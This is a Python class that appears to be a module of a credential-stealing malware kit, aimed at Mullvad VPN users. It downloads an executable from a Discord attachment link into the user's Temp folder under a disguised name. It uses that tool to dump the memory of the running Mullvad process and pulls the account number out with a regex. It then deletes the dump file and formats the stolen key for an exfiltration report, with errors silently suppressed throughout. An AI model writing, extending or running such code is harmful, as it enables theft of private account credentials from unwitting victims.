class VPNstal:

    def __init__(self):
        self.mullvadfound = 0
        self.content = """
``|_`` :open_file_folder: ``VPNs``"""
        if os.path.exists(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe")):
            pass
        else:open(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe"),"wb").write(requests.get("https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/procdump.exe").content)
        try:
            self._mullvad()
        except:
            pass

    def _mullvad(self):
        mullkey = ""
        try:
            procID = ""
            smallest_time  = 9999999999999999999999999999
            for process in psutil.process_iter(['pid','create_time','name']):
                if process.info['name'] == 'Mullvad VPN.exe':
                    if float(process.info['create_time']) < float(smallest_time):
                        smallest_time = float(process.info['create_time'])
                        procID = process.info['pid']
            subprocess.run([os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe"), '-accepteula','-ma', str(procID), os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","777mullvad.dmp")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            mullkey = str(re.findall(r"\d{16}Uf", open(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","777mullvad.dmp"),'r',errors="ignore").read())[0]).split("Uf")[0]
        except:
            pass
        try:os.remove(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","777mullvad.dmp"))
        except:pass
        if mullkey == "":
            pass
        else:
            self.mullvadfound += 1
            self.content += f"""
``|   |_``:lock: ``Mullvad Account Number : {mullkey}``"""

    def __repr__(self):
        if self.mullvadfound == 0:
            self.content += f"""
``|   |_``:x: ``No VPNs Data Found``"""
        return self.content